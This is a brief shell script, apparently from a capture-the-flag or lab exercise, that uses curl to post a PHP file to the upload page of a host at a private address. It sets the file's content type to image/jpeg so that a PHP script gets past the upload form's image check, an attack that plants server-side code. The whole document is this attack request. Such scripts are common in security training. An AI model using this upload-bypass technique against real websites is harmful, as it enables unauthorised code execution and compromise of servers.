ip="http://192.168.0.148"

curl -o sinkosi.html -X POST \
-F 'Upload=Upload' \
-F 'uploaded=@file.php;type=image/jpeg' \
"${ip}/?page=upload"